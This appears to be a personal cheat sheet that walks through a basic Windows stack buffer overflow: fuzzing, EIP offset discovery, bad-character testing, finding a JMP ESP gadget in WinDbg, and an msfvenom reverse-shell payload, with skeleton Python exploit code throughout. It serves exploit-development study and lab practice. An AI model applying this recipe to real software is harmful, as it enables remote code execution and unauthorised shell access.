## Stack Overflow - Basic

### Table of Contents

* 1.0 [Crash the application.](#Crash)
* 2.0 [Control the EIP.](#EIP)
* 3.0 [Locate Space for our shellcode.](#LocateShellcode)
* 4.0 [Calculate Space for our shellcode.](#SpaceShellcode)
* 5.0 [Checking for bad characters.](#BadChars)
* 6.0 [Finding Returning address.](#JMP)
* 7.0 [Controling the Execution Flow.](#ControlExecutionFlow)
* 8.0 [Get a Shell!](#Shell)
* 9.0 [No Shell?](#NoShell)
* 10.0 [Sometimes...](#Sometimes)
  * 10.1 [Not enough space to test bad characters.](#NotEnoughSpace-BadChars) 
  * 10.2 [Not enough space for the shellcode.](#NotEnoughSpace-Shellcode)

#### 1. Crash the application. ("A" buffer.)<a name="Crash"></a>

```python
...
size = 3000

buffer = "A" * size
...
```

#### 2. Control the EIP.<a name="EIP"></a>

First, generate the unique string, locate the EIP value, and locate it's exact offset.

```bash
┌──(v0lk3n㉿Laptop)-[~/StackOverflow-Basic]
└─$ msf-pattern_create -l 3000
...

# Replace the buffer with this unique string in our PoC.
# Run the PoC and pick the EIP value at the time of the crash.

┌──(v0lk3n㉿Laptop)-[~/StackOverflow-Basic]
└─$ msf-pattern_offset -q <EIP> -l 3000
...
#Let's say EIP offset = 2600
```

Now Verify that you control EIP. ("A" + "B" + "C" buffer.)

```python
...
size = 3000

buffer = "A" * 2600
eip = "B" * 4
shellcode = "C" * (size - len(buffer) - len(eip))
...
````

#### 3. Locate Space for our shellcode. ("A" + "B" + "C" buffer.)<a name="LocateShellcode"></a>

```python
size = 3000

buffer = "A" * 2600
eip = "B" * 4
shellcode = "C" * 700
```

Verify that we didn't caused a different crash and inspect the stack pointer at the time of the crash.

```bash
0:005> dds esp L3
```

Check where begin our "C" buffer.

```bash
0:005> dds esp -10 L20
```

If the ESP register didnt point exactly at the begin of our "C" buffer, for example, the ESP point 8 offset after the beginning of our bunch of "C". This will cause a problem as the bunch of "C" will be the place for our shellcode. We can avoid this by adding after te EIP, "8 * C" for the 8 offset, then "692 * D" for our shellcode.

```python
size = 3000

buffer = "A" * 2600
eip = "B" * 4
offset = "C" * 8
shellcode = "D" * 692
...
```

#### 4. Calculate Space for our shellcode.  ("A" + "B" + "C" + "D" buffer, where "C" is our 8 offset, and "D" is our shellcode place.)<a name="SpaceShellcode"></a> 

Check the Beginning of the "D" buffer.

```bash
0:005> dds esp -8 L7
```

Check the End of "D" buffer. (dds esp+250 L4)

```bash
0:005> dds esp+250 L4
```

Calcule the place for our shellcode. 

```bash
0:005> ? <End of the buffer> - <Beginning of the buffer>
```

#### 5. Checking for bad characters. (0x00 is not in the list and is considered as bad char)<a name="BadChars"></a>

```python
 ...
 size = 3000
 
 buffer = b"A" * 2600
 eip = b"B" * 4
 offset = b"C" * 8
 badchars = (
 b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
 b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
 b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
 b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
 b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
 b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
 b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
 b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
 b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
 b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
 b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
 b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
 b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
 b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
 b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
 b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
 b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
 b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
 b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
 b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```

```bash
0:005> db esp - 10 L110
```

#### 6. Finding Returning address.<a name="JMP"></a>

Locate a dll without protection (SEH OFF) using the WinDbg extension <a href="https://code.google.com/archive/p/narly/">"Narly"</a>

```bash
0:005> .load narly

0:005> !nmod
```

Find opcodes of JMP ESP instruction.

```bash
nasm > JMP ESP
00000000  FFE4              jmp esp
```

Locate a jmp esp instruciton inside the dll. Be sure that the address didn't contain any bad characters.

```bash
0:005> lm m Appli1
Browse full module list
start    end        module name
12400000 12423000   Appli1   (deferred)

0:005> s -b 12400000 12423000 0xff 0xe4
124060cf  ...

0:005> u 124060cf
...
124060cf ffe4            jmp     esp
...
```

#### 7. Controling the Execution Flow.<a name="ControlExecutionFlow"></a>

Replace the B buffer with JMP ESP instruction (EIP).

```python
...
size = 3000

buffer = b"A" * 2600
eip = b"\xcf\x60\x40\x12" # 124060cf JMP ESP 
offset = b"C" * 8
shellcode = b"D" * 692
...
```

Set a breakpoint to JMP ESP, continue the execution flow, and run the PoC.

```bash
0:005> bp 124060cf
0:005> g
```

Walking throught the code with "t" command, once we reach the next instruction of "JMP ESP", read the value of esp register to confirm it contain our bunch of "D".

```bash
...
0:005> t
...
0:005> dc esp L4
```

#### 8. Get a Shell!<a name="Shell"></a>

Replace our bunch of D with our shellcode excluding the found badchars (only 0x00 in our case).

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -b "\x00" -f python -v shellcode
```

Execute our exploit and get a shell.

#### 9. No Shell?<a name="NoShell"></a>

If after executing the PoC you didn't get a shell, analyse the crash.

If you see that you'r shellcode is mangled, you can use NOPs instruction before the shellcode, those instruction will be executed since it reach the shellcode to execute it.

```python
...
size = 3000

buffer = b"A" * 2600
eip = b"\xcf\x60\x40\x12" # 124060cf JMP ESP 
offset = b"C" * 8
nops = b"\x90" * 10
shellcode = <Shellcode Here>
...
```
 
### 10. Sometimes ...<a name="Sometimes"></a>
 
#### 10.1 Not enough space to test bad characters.<a name="NotEnoughSpace-BadChars"></a>

Sometime, if you didn't have enough size to test all the bad characters in one shot.
 
To overcome this, you can comment all the badchars line, and send the maximum badchars size possible at a time.

#### 10.2 Not enough space for the shellcode.<a name="NotEnoughSpace-Shellcode"></a>

If you cant find enought space for the shellcode, once you get the JMP ESP instruction, check if any others registers redirect to our buffer (it can be the "A" buffer too).
 
Then if you find it (example ECX), find the JMP ECX opcodes.
 
```bash
┌──(v0lk3n㉿Laptop)-[~/StackOverflow-Basic]
└─$ msf-nasm_shell
nasm > JMP ECX
00000000  FFE1              jmp ecx
```

Complete the address with NOPs instructions to redirect the flow to it.
 
```python
...
size = 2600
shell = <shellcode here>

buffer = b"\x90" * (size - len(shell))
eip = b"\xcf\x60\x40\x12" # 124060cf JMP ESP 
ecx = b"\xff\xe1\x90\x90" # 0xffe1 JMP ECX NOP NOP
nops = b"\x90" * 10
...
```


